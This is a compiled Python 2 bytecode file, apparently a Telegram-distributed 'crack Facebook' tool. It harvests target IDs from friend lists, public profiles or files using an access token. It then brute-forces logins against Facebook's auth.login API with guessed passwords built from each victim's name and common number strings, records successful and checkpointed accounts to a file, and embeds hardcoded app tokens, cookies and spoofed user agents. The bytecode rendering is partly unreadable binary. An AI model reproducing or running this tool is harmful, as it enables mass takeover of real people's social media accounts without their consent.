ó
 ÿc           @   sV  e  Z e r# d  d  Z   Z n  d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l	 Z	 d d l
 Z
 d d l Z d d l Z d d l Z d d l Z d d l Z d d l m Z d d l m Z d d l m Z e e  e j d  e j   Z e j e   i d d 6d	 d
 6d d 6d d 6d d 6d d 6d d 6d d 6d d 6d d 6d d 6d d 6d d  6d! d" 6d# d$ 6e _ d8 g e _ d9 g e _ d: g e _ d-   Z d.   Z d/   Z d0   Z d1   Z d2 Z  d  Z! g  Z" g  Z# g  Z$ g  a% g  Z& g  Z' g  Z( d3   Z) d4   Z* d5   Z+ d6   Z, e- d7 k rRe)   n  d S(;   i    iÿÿÿÿN(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8s   */*t   accepts   gzip, deflate, brs   accept-encodings   en-GB,en-US;q=0.9,en;q=0.8s   accept-languaget   270s   content-lengths!   application/x-www-form-urlencodeds   content-types   ig_cb=1; ig_did=BF4465A9-017D-4668-B5C3-EBD3DA65B2A6; csrftoken=b8kQhInVzG8P5hvZwlxD38EjOrMfqxkC; rur=ASH; mid=XzHZAQALAAEagshAZoRCgkUeXmJPt   cookiet   emptys   sec-fetch-destt   corss   sec-fetch-modes   same-origins   sec-fetch-sitess   Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36s
   user-agentt    b8kQhInVzG8P5hvZwlxD38EjOrMfqxkCs   x-csrftokent   936619743392459s   x-ig-app-idt   0s   x-ig-www-claimt   a9aec8fa634fs   x-instagram-ajaxt   XMLHttpRequests   x-requested-withs
   User-Agents   Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30s   Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36s   Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.7.2246.114996s§   Mozilla/5.0 (Linux; U; Android 7.0; en-US; SM-G935F Build/NRD90M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.8.976 U3/0.8.0 Mobile Safari/534.30s£   Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G955U Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36sR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16s  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]c           C   s   d GHt  j j   d  S(   Ns   [!] Exit(   t   ost   syst   exit(    (    (    s   230970576o.pyR   !   s    c         C   sS   d } d } x: t  D]2 } | d | t j d t |  d  | 7} q Wt |  S(   Nt   ahtdzjct    t   !i    i   (   t   xt   randomt   randintt   lent   cetak(   t   bt   wt   dt   i(    (    s   230970576o.pyt   acak&   s
    0c         C   s~   d } xA | D]9 } | j  |  } | j d | d t d |   } q W| d 7} | j d d  } t j j | d  d  S(   NR   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strR   t   stdoutt   write(   R   R   R   t   jR   (    (    s   230970576o.pyR   .   s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¸ëQ¸?(   R   R!   R"   t   flusht   timet   sleep(   t   zt   e(    (    s   230970576o.pyt   hamza8   s    c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¹?(   R   R!   R"   R$   R%   R&   (   R'   R(   (    (    s   230970576o.pyt   hopss=   s    ss  
[1;97m    |     ____      |                '||    ||'     |     '||''|.    ..|'''.|  
[1;97m   |||    `  ||    |||      ....      |||  |||     |||     ||   ||  .|'     '  
[1;97m  |  ||      /,   |  ||   .|...||     |'|..'||    |  ||    ||''|'   ||    .... 
[1;97m .''''|.    //   .''''|.  ||          | '|' ||   .''''|.   ||   |.  '|.    ||  
[1;97m.|.  .||.  ((   .|.  .||.  '|...'    .|. | .||. .|.  .||. .||.  '|'  ''|...'|  
[1;97m           ||                                                                  
[1;97m           |' 

[1;97mMy Telegram : [1;97m@A7Ae_MARG

[1;97mMy Chanell : [1;97m@A7AeMARG
    c           C   s1   t  j d  t GHd GHd GHd GHd GHt   d  S(   Nt   clears;   [1;97m
~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~s   [1] START CRACK FACEBOOKs   [2] update Tool(   R   t   systemt   bannert   menu_action(    (    (    s   230970576o.pyt   menuZ   s    c          C   s¥   t  d  }  |  d k r4 d GHt j d  t   nm |  d k rJ t   nW |  d k r¡ t j d  t GHHt d  t j d	  t d
  t j d  t   n  d  S(   Ns   Choose Option : R   s   Wrong Inputi   t   1t   2R+   s   Please Wait.s   git pull origin masters   Tool Has Updatedi   (	   t	   raw_inputR%   R&   R/   t   crackR   R,   R-   R)   (   t   act(    (    s   230970576o.pyR.   d   s     



c           C   s;   t  j d  t GHd GHd GHd GHd GHd GHd GHt   d  S(   NR+   s;   [1;97m
~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~s   [1] Crack From Friendlists   [2] Crack From Public IDs   [3] Crack From Files   [0] Back(   R   R,   R-   t
   crack_menu(    (    (    s   230970576o.pyR3   u   s    c             s  t  d  }  |  d k r' d GHt   ng|  d k rÀ t j d  t GHHt  d    t j d  t j d  t GHHt j d    } t	 j
 | j  } xô| d	 D] } t j | d
  q¢ WnÎ|  d k rÞt j d  t GHHt  d    t j d  t j d  t GHd GHt  d  } yC t j d | d    } t	 j
 | j  } t d | d  Wn' t k
 rd GHt  d  t   n Xt j d | d    } t	 j
 | j  } xÖ | d	 D] } t j | d
  qÀWn° |  d k rlt j d  t GHyC t  d  } x0 t | d  j   D] }	 t j |	 j    q!WWqt k
 rhd GHt  d  t   qXn" |  d k rt   n d GHt   t d t t t    t j d  t d  t j d  t d  t j d  Hd  d! GH  f d"   }
 t d#  } | j |
 t  d$ GHt d%  t d&  t t t   } t t t   } d' t t t   d( t t t   GHd  d! GHt  d)  t   d  S(*   Ns   Choose Option : R   s   [!] Filled IncorrectlyR0   R+   s   Paste Token Here : i   s3   https://graph.facebook.com/me/friends?access_token=t   datat   idR1   s;   [1;97m
~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~s   [+] Input ID: s   https://graph.facebook.com/s   ?access_token=s(   [1;97m[ ] Account Name [1;97m:[1;97m t   names   [!] ID Not Found!s   
Press Enter To Back  s   /friends?access_token=t   3s   [+] File Name: t   rs   [!] File Not Found.s   Press Enter To Back. R   s   Filled Incorrectlys   [ ] Total Friends: g      à?s!   [ ] The Process Has Been Started.s%   [ ] To Stop Process Press CTRL Then Zi/   t   -c            s&  |  } y t  j d  Wn t k
 r* n Xyít j d | d    } t j | j  } | d d } t j	 d | d | d  } t j
 |  } d	 | k rÈ d
 | d | GHt j | |  nOd | d k r/d | d | GHt d d  } | j | d | d  | j   t j | |  nèd } t j	 d | d | d  } t j
 |  } d	 | k rd
 | d | GHt j | |  nd | d k rûd | d | GHt d d  } | j | d | d  | j   t j | |  nd }	 t j	 d | d |	 d  } t j
 |  } d	 | k r`d
 | d |	 GHt j | |	  n·d | d k rÇd | d |	 GHt d d  } | j | d |	 d  | j   t j | |	  nP| d d }
 t j	 d | d |
 d  } t j
 |  } d	 | k r4d
 | d |
 GHt j | |
  nãd | d k rd | d |
 GHt d d  } | j | d |
 d  | j   t j | |
  n|| d d } t j	 d | d | d  } t j
 |  } d	 | k rd
 | d | GHt j | |  nd | d k rod | d | GHt d d  } | j | d | d  | j   t j | |  n¨| d d } t j	 d | d | d  } t j
 |  } d	 | k rÜd
 | d | GHt j | |  n;d | d k rCd | d | GHt d d  } | j | d | d  | j   t j | |  nÔ | d d } t j	 d | d | d  } t j
 |  } d	 | k r°d
 | d | GHt j | |  ng d | d k rd | d | GHt d d  } | j | d | d  | j   t j | |  n  Wn n Xd  S(   Nt   saves   https://graph.facebook.com/s   /?access_token=t
   first_namet   12s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6t   access_tokens)   [1;32m[[1;32mSuccessful[1;32m][1;32m s    [1;92m|[1;32m s   www.facebook.comt	   error_msgs)   [1;97m[[1;97mCheckpoint[1;97m][1;97m s    [1;97m|[1;97m s   save/checkpoint.txtt   at   |s   
t
   1234554321t
   1122334455t   123t   12345t   1122t	   last_name(   R   t   mkdirt   OSErrort   requestst   gett   jsont   loadst   textt   urllibt   urlopent   loadt   okst   appendt   openR"   t   closet
   checkpoint(   t   argt   userRA   R   t   pass1R6   t   qt   crtt   pass2t   pass3t   pass4t   pass5t   pass6t   pass7(   t   token(    s   230970576o.pyt   mainÊ   s¼    






i(   s<   [1;97m---------------------A7Ae MARG-----------------------s   [ ] Process Has Been Completed.s)   [1;97m[ ] Checkpoint IDS Has Been Saved.s'   [ ] Total [1;32mOK/[1;97mCP : [1;32ms   /[1;97ms   
Press Enter To Back (   R2   R5   R   R,   R-   R%   R&   RK   RL   RM   RN   RO   R7   RT   R)   t   KeyErrorR3   RU   t	   readlinest   stript   IOErrorR/   R    R   R    t   mapRS   RW   (   t   crmR:   R'   t   st   idtt   jokt   opR   t   idlistt   lineRd   t   pt   xxt   xxx(    (   Rc   s   230970576o.pyR5      s    





	s

)	
t   __main__(   s
   User-Agents   Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30s   Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36s   Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.7.2246.114996s§   Mozilla/5.0 (Linux; U; Android 7.0; en-US; SM-G935F Build/NRD90M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.8.976 U3/0.8.0 Mobile Safari/534.30s£   Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G955U Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(   s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;](.   t   Falset   foot   barR   R   R%   t   datetimeR   t   hashlibt   ret	   threadingRM   RP   t	   cookielibRK   t	   mechanizet   multiprocessing.poolR    t   requests.exceptionsR   R   t   reloadt   setdefaultencodingt   brt   set_handle_robotst   headheadt
   addheadersR   R   R   R)   R*   R-   t   backt   threadst
   successfulRW   RS   t   gagalt   idhR7   R/   R.   R3   R5   t   __name__(    (    (    s   230970576o.pyt   <module>   sd   

			
			
			Ë